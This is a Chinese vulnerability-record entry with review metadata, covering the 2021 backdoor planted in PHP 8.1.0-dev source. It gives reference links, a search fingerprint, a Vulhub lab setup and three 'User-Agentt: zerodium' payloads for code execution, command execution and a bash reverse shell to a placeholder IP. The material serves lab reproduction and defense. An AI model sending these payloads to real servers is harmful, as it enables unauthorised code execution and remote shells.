---
version: "PHP 8.1.0-dev"
product: "PHP 2021 开发仓库后门事件"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "PHP-8.1.0-dev-开发版本-zerodium-后门漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：PHP8.1.0-dev仅标签不够，正文限定服务器存在该后门较准确"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "missing"
id: "vw-182c2c26433d503006e3f583"
entity_id: "ve-182c2c26433d503006e3f583"
schema_version: "1"
---

## 核对与使用边界

- 版本归属更正：这是 2021 年受污染 PHP 开发提交的后门事件，`8.1.0-dev` 标签本身不能区分干净与被污染构建；不应把全部同名开发版归为后门。应核源码提交/包来源和 User-Agentt 对应恶意分支，保留原三种请求但不新增利用。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：PHP8.1.0-dev仅标签不够，正文限定服务器存在该后门较准确

代码与实验材料：三种User-Agentt头示例、Vulhub环境但无完整响应

来源证据范围：PHP internals与两恶意提交c730aa26、2b0f239b直接链接，三篇中来源最完整

- **事实待核（1）**：受影响版本字段需改为构建/提交范围；依据：仅PHP8.1.0-dev会误收干净开发版；未说明修复后的版本标识可能相同。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **证据待核（2）**：实验步骤缺目录和结果；依据：compose无路径，结果区域为空白。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# PHP 8.1.0-dev 开发版本 zerodium 后门漏洞

## 漏洞描述

PHP 8.1.0-dev 版本在 2021 年 3 月 28 日被植入后门，但是后门很快被发现并清除。当服务器存在该后门时，攻击者可以通过发送 User-Agentt 头来执行任意代码。

参考链接：

- https://news-web.php.net/php.internals/113838
- https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d
- https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a

## 漏洞影响

```
PHP 8.1.0-dev
```

## 网络测绘

```
"PHP/8.1.0-dev"
```

## 环境搭建

Vulhub 执行如下命令启动一个存在后门的 PHP 8.1 服务器：

```
docker compose up -d
```

环境启动后，服务运行在 `http://your-ip:8080`。

## 漏洞复现

添加请求头，注意是 **User-Agentt** 不是 User-Agent。

执行代码：

```
User-Agentt: zerodiumvar_dump(233*233);
```



执行命令：

```plain
User-Agentt: zerodiumsystem("id");
```



反弹 shell：

```
User-Agentt: zerodiumsystem("bash -c 'exec bash -i &> /dev/tcp/<your-ip>/<port> <& 1'");
```


